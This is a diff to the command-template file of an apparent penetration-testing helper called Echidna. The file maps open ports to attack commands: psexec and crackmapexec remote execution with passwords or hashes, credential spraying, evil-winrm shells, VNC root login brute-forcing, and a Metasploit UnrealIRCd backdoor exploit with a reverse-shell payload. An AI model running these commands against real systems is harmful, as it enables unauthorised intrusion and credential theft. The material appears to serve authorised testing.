@@ -1,18 +1,13 @@
 [Echidna]
 pattern: nmap
-description: scan welknown ports using nmap
+description: Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. -p- option scan all ports. -A option enables OS detection, version detection, script scanning, and traceroute. -script vuln option enables scan vulnerabiliities. -T4 option enables aggressive scan. -O enables OS scan.
 template: nmap {host}
-description: scan all ports using nmap
 template: nmap -Pn -p- {host}
-description: -A option enables OS detection, version detection, script scanning, and traceroute
 template: nmap -Pn -sV -A -p{port} {host}
-description: scan vulnerabiliities using nmap
 template: nmap -Pn -sV -script vuln -p{port} {host}
-description: aggressive scan using nmap
 template: nmap -Pn -A -T4 {host}
-description: OS scan using nmap
 template: sudo nmap -Pn -O -T4 {host}
-group: nmap
+group: Nmap
 [end]
 
 [Echidna]
@@ -107,10 +102,27 @@ group: SMB
 [end]
 
 [Echidna]
+description: psexec.py will create a new service (using \pipe\svcctl via SMB) in the victim machine and use it to execute something.
+template: psexec.py {user}:{password}@{host}
+template: psexec.py {domain}/{user}:{password}@{host}
+template: psexec.py {user}@{host} -hashes {passwordhash}
+condition: ["139", "445", "netbios", "microsoft-ds"]
+group: SMB
+[end]
+
+[Echidna]
 description: crackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. Y
-template: crackmapexec smb {host} -u <username> -p <password> -x whoami
+template: crackmapexec smb {host} -u {user} -p {pass} -x whoami
+template: crackmapexec smb {host} -u {userlistfile} -p {passlistfile}
 condition: ["139", "445", "5985", "5986", "netbios", "microsoft-ds"]
 group: SMB
+[end]
+
+[Echidna]
+description: crackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. Y
+template: crackmapexec winrm {host} -u {user} -p {pass}
+condition: ["5985", "5986"]
+group: WinRM
 [end]
 
 [Echidna]
@@ -176,7 +188,7 @@ group: Exploit
 
 [Echidna]
 description: connect to mysql service
-template: mysql -u$username$ -p$password$ -h {host}
+template: mysql -u{user} -p{pass} -h {host}
 description: Enumeration using nmap script
 template: nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 {host}
 condition: ["mysql", "3306"]
@@ -264,9 +276,9 @@ group: SMB
 
 [Echidna]
 pattern: evin-winrmi
-description: Scan smb version via metasploit module
-template: evil-winrm -i {host} -u <UserName> -H <Hash>
-template: evil-winrm -i {host} -u '<UserName>' -p '<Password>'
+description: evil-winrmi provides remote shell access to Windows machines over WinRM (Windows Remote Management).
+template: evil-winrm -i {host} -u {user} -H {hash}
+template: evil-winrm -i {host} -u {user} -p {password}
 condition: ["5985", "5986"]
 group: WinRM
 [end]
@@ -309,13 +321,111 @@ group: HTTP
 [end]
 
 [Echidna]
-description: hoge description
-template: hoge
-group: Hoge
+description: DNS Enumration. Standard Scan
+template: dnsrecon {domain}
+condition: ["53", "dns"]
+group: DNS
+[end]
+
+
+[Echidna]
+description: checks the available encryption and DoS vulnerability (without causing DoS to the service) and obtains NTLM Windows info (versions).
+template: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {host}
+condition: ["3389", "RDP"]
+group: RDP
 [end]
 
 [Echidna]
-description: hoge2 description
-template: hoge2
-group: Hoge
+description: The rlogin command enables you to log in to other UNIX machines on your network.
+template: rlogin -l root {host} -p {port}
+condition: ["512", "513", "514"]
+group: RLOGIN
+[end]
+
+[Echidna]
+description: showmount queries the mount daemon on a remote host for information about the state of the NFS server on that machine.
+template: showmount -e {host}
+description: list all mount points
+template: showmount -a {host}
+description: list all directories
+template: showmount -d {host}
+condition: ["nfs", "2049"]
+group: NFS
+[end]
+
+[Echidna]
+description: connect shared drive via nfs using mount
+template: mount -t nfs {host} /tmp/
+template: mount -t nfs {host}:<remote_folder> /tmp/
+condition: ["nfs", "2049"]
+group: NFS
+[end]
+
+[Echidna]
+description: Telnet is a network protocol that gives users a UNsecure way to access a computer over a network.
+template: telnet {host} {port}
+description: Use -vn option for banner grabbing
+template: telnet -vn {host} {port}
+group: Useful Command
+[end]
+
+[Echidna]
+description: Launch simple Web Server
+template: sudo python3 -m http.server 80
+group: Useful Command
+[end]
+
+[Echidna]
+description: SSH connection command
+template: ssh {host}
+template: ssh {user}@{host}
+condition: ["ssh", "22"]
+group: SSH
+[end]
+
+[Echidna]
+description: SMTP Version check using metasploit module
+template: msfconsole -q -x "use auxiliary/scanner/smtp/smtp_version; set rhosts {host}; exploit"
+description: Enumerate service users using nmap module
+template: nmap --script smtp-enum-users -p 25 {host}
+condition: ["SMTP", "25"]
+group: SMTP
+[end]
+
+[Echidna]
+description: SMTP Version check using metasploit module
+template: msfconsole -q -x "use auxiliary/scanner/smtp/smtp_version; set rhosts {host}; exploit"
+description: Enumerate service users using nmap module
+template: nmap --script smtp-enum-users -p 25 {host}
+condition: ["SMTP", "25"]
+group: SMTP
+[end]
+
+[Echidna]
+description: Gets you list of ports open using RPC services. list short summary of rpc services
+template: rpcinfo -s {host}
+description: list ports of rpc services
+template: rpcinfo -s {host}
+description: try connecting with null session
+template: rpcclient -U "" {host}
+condition: ["rpcbind", "111"]
+group: RPCbind
+[end]
+
+[Echidna]
+description: try to login by root user using metasploit module. password for root user is retured if the attack success.
+template: msfconsole -q -x "use auxiliary/scanner/vnc/vnc_login; set username root; set rhosts {host}; exploit"
+description: launch VNC (Virtual Network Computing) client
+template: vncviewer {host}
+condition: ["vnc", "5900"]
+group: VNC
+[end]
+
+[Echidna]
+description: find and scan IRC services using nmap
+template: nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 {host}
+description: exploit IRCD service with metasploit (CVE-2010-2075)
+template: msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set payload cmd/unix/reverse; set lhost {localip}; set rhosts {host}; exploit";
+condition: ["irc", "6667"]
+group: IRC
 [end]
